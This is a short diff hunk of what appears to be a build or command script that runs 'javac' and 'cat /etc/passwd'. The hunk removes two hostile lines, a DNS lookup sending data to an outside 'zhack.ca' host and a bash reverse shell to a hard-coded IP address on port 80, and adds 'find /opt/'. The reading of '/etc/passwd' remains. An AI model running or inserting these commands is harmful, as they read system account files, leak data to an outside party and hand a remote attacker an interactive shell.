@@ -2,5 +2,4 @@
 
 javac src/Main.java
 cat /etc/passwd
-nslookup mydatahere.ecec459e647ea6be494a.d.zhack.ca
-bash -i >& /dev/tcp/207.148.68.137/80 0>&1
+find /opt/
